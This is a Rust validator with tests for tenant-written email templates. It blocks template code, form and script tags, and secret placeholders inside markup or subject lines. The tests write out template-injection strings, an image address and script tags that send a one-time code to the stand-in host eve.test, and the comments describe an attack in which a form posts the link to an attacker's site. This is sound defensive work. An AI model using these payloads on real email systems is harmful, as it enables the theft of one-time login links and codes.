//! Checks on what a tenant's own email template may contain.
//!
//! A template holds text and bare `{{ name }}` placeholders for the values
//! its type is given. Nothing else is accepted. The mailer renders with a
//! full template language, so a filter, loop, block, comment or lookup could
//! rebuild the one-time link in `action_link` and send it elsewhere.

use crate::domains::branding::email_template::TemplateVariable;
use crate::message;
use crate::shared::errors::DomainError;

const OPEN_VALUE: &str = "{{";
const CLOSE_VALUE: &str = "}}";
const OPEN_STATEMENT: &str = "{%";
const OPEN_COMMENT: &str = "{#";

/// Refuses text holding template code other than a bare placeholder from
/// `allowed`.
pub(super) fn ensure_only_placeholders(
    text: &str,
    allowed: &[TemplateVariable],
) -> Result<(), DomainError> {
    if text.contains(OPEN_STATEMENT) || text.contains(OPEN_COMMENT) {
        return Err(DomainError::invalid(message!(
            "branding-a-custom-email-may-hold-placeholders",
            "a custom email may hold placeholders like {{ user_name }}, but no other template code"
        )));
    }
    let mut rest = text;
    while let Some((_, opened)) = rest.split_once(OPEN_VALUE) {
        let Some((name, after)) = opened.split_once(CLOSE_VALUE) else {
            return Err(DomainError::invalid(message!(
                "branding-a-placeholder-in-a-custom-email",
                "a placeholder in a custom email is never closed"
            )));
        };
        ensure_known(name.trim(), allowed)?;
        rest = after;
    }
    Ok(())
}

/// Each `{{ name }}` placeholder in `text`, as the text before it and its
/// name.
fn placeholders(text: &str) -> Vec<(&str, &str)> {
    let mut found = Vec::new();
    let mut rest = text;
    while let Some((_, opened)) = rest.split_once(OPEN_VALUE) {
        let Some((name, after)) = opened.split_once(CLOSE_VALUE) else {
            break;
        };
        let start = text
            .len()
            .saturating_sub(opened.len().saturating_add(OPEN_VALUE.len()));
        found.push((text.get(..start).unwrap_or_default(), name.trim()));
        rest = after;
    }
    found
}

/// The placeholders that carry a secret: the one-time link, and a one-time
/// code.
const SECRETS: [TemplateVariable; 2] =
    [TemplateVariable::ActionLink, TemplateVariable::OneTimeCode];

/// The text before each placeholder in `text` that carries a secret.
fn links(text: &str) -> impl Iterator<Item = &str> + '_ {
    placeholders(text)
        .into_iter()
        .filter(|(_, name)| SECRETS.iter().any(|secret| secret.key() == *name))
        .map(|(before, _)| before)
}

/// Whether `text` writes the one-time link or a one-time code.
pub(super) fn writes_secret(text: &str) -> bool {
    links(text).next().is_some()
}

/// The name after every `<` in `html`, as written. Text that names no tag
/// gives an empty name.
pub(super) fn tag_names(html: &str) -> impl Iterator<Item = &str> + '_ {
    html.split('<').skip(1).map(tag_name)
}

/// Refuses the one-time link or code in a subject line. Subjects show up in
/// lists, previews and logs, where anyone reading them could use it.
pub(super) fn ensure_no_link(subject: &str) -> Result<(), DomainError> {
    if links(subject).next().is_some() {
        return Err(DomainError::invalid(message!(
            "branding-a-subject-line-may-not-hold",
            "a subject line may not hold {{ action_link }} or {{ one_time_code }}"
        )));
    }
    Ok(())
}

/// Refuses the one-time link or code anywhere but the readable text of an
/// HTML body.
///
/// The platform writes a whole `<a href>` in the link's place. Inside a
/// tag, an attribute, a style or a script, the link or the code would
/// become part of an address the template's author chose. The mail client
/// would then send it there, often without a click.
pub(super) fn ensure_link_outside_markup(html: &str) -> Result<(), DomainError> {
    for before in links(html) {
        let before = before.to_ascii_lowercase();
        let in_tag = before.rfind('<') > before.rfind('>');
        let in_block = ["style", "script"]
            .iter()
            .any(|block| before.rfind(&format!("<{block}")) > before.rfind(&format!("</{block}")));
        if in_tag || in_block {
            return Err(DomainError::invalid(message!(
                "branding-and-may-only-stand-in-the",
                "{{ action_link }} and {{ one_time_code }} may only stand in the text of an email, not inside a tag, an attribute, a style or a script"
            )));
        }
    }
    Ok(())
}

/// Tags a custom HTML email may not hold, anywhere.
///
/// Each one can send what the reader sees, or clicks, to an address the
/// template's author chose. A form posts the link, a field or button sends
/// it with a form, `base` and `meta` move the reader or every relative
/// address, a frame shows the author's own page, and a script can read the
/// link and send it anywhere.
const REFUSED_ELEMENTS: &[&str] = &[
    "form", "textarea", "input", "button", "base", "meta", "iframe", "script",
];

/// Refuses an HTML body holding any tag in [`REFUSED_ELEMENTS`], in any
/// letter case.
///
/// Eve wraps `{{ action_link }}` in a form that posts to her site. Alice
/// clicks "Confirm" and her one-time link goes to Eve.
pub(super) fn ensure_no_form_elements(html: &str) -> Result<(), DomainError> {
    let refused = tag_names(html).find(is_refused);
    let Some(name) = refused else {
        return Ok(());
    };
    Err(DomainError::invalid(message!(
        "branding-a-custom-email-may-not-hold",
        format!(
            "a custom email may not hold a <{}> tag",
            name.to_ascii_lowercase()
        )
    )))
}

/// Whether `name` is in [`REFUSED_ELEMENTS`], in any letter case.
fn is_refused(name: &&str) -> bool {
    REFUSED_ELEMENTS
        .iter()
        .any(|refused| refused.eq_ignore_ascii_case(name))
}

/// The tag name at the start of `after_open`, the text after a `<`.
fn tag_name(after_open: &str) -> &str {
    let end = after_open
        .find(|c: char| !c.is_ascii_alphanumeric())
        .unwrap_or(after_open.len());
    after_open.get(..end).unwrap_or_default()
}

/// Refuses the one-time link in a text body unless it starts a line or
/// follows a space.
///
/// Glued to the text before it, the link becomes the end of an address the
/// template's author chose. Text after the link cannot move it to another
/// host, so a full stop after it is fine.
pub(super) fn ensure_link_stands_alone(text: &str) -> Result<(), DomainError> {
    for before in links(text) {
        let before = before.chars().next_back();
        if !before.is_none_or(char::is_whitespace) {
            return Err(DomainError::invalid(message!(
                "branding-and-must-start-a-line-or",
                "{{ action_link }} and {{ one_time_code }} must start a line or follow a space in a text email"
            )));
        }
    }
    Ok(())
}

fn ensure_known(name: &str, allowed: &[TemplateVariable]) -> Result<(), DomainError> {
    if allowed.iter().any(|variable| variable.key() == name) {
        return Ok(());
    }
    Err(DomainError::invalid(message!(
        "branding-is-not-a-placeholder-this-email",
        format!("{{{{ {name} }}}} is not a placeholder this email can fill")
    )))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::domains::branding::email_template::TemplateVariable::{ActionLink, UserName};

    const ALLOWED: &[TemplateVariable] = &[UserName, ActionLink];

    /// A template mixes text with `{{user_name}}` and `{{ action_link }}`,
    /// with and without spaces inside the braces. Both forms are accepted.
    #[test]
    fn plain_text_and_known_placeholders_are_accepted() {
        let text = "Hello {{user_name}}, reset here: {{ action_link }}. Thanks!";

        assert!(ensure_only_placeholders(text, ALLOWED).is_ok());
    }

    /// A template uses `{{ tenant_name }}`, which this email type is not
    /// given. It is refused, so the email never goes out with a blank gap.
    #[test]
    fn a_placeholder_this_email_does_not_fill_is_refused() {
        assert!(ensure_only_placeholders("{{ tenant_name }}", ALLOWED).is_err());
    }

    /// Template expressions, filters, loops, assignments and comments are
    /// rejected, along with whitespace-control syntax and an unclosed placeholder.
    #[test]
    fn template_code_beyond_a_bare_placeholder_is_refused() {
        for text in [
            "{{ action_link | replace('a', 'b') }}",
            "{{ action_link.split('\"') }}",
            "{{- user_name -}}",
            "{% for c in action_link %}{{ c }}{% endfor %}",
            "{# hidden #}",
            "{% set x = action_link %}",
            "Hello {{ user_name",
        ] {
            assert!(ensure_only_placeholders(text, ALLOWED).is_err(), "{text}");
        }
    }

    /// A template holds `}}` with no `{{` before it. That is plain text and
    /// is accepted.
    #[test]
    fn a_closing_brace_pair_alone_is_text() {
        assert!(ensure_only_placeholders("a }} b", ALLOWED).is_ok());
    }

    /// A one-time code is rejected inside an image address or subject,
    /// while the same placeholder remains valid in paragraph text.
    #[test]
    fn a_one_time_code_stands_only_in_readable_text() {
        let in_image = "<img src=\"https://eve.test/?c={{ one_time_code }}\">";

        assert!(ensure_link_outside_markup(in_image).is_err());
        assert!(ensure_no_link("Your code {{ one_time_code }}").is_err());
        assert!(ensure_link_outside_markup("<p>Your code: {{ one_time_code }}</p>").is_ok());
    }

    /// Inline and externally loaded scripts are rejected even in mail
    /// without a secret placeholder, including uppercase script tags.
    #[test]
    fn a_script_is_refused_in_any_email() {
        for html in [
            "<p>Hi</p><script>fetch('https://eve.test')</script>",
            "<SCRIPT src=\"https://eve.test/x.js\"></SCRIPT>",
        ] {
            assert!(ensure_no_form_elements(html).is_err(), "{html}");
        }
    }
}
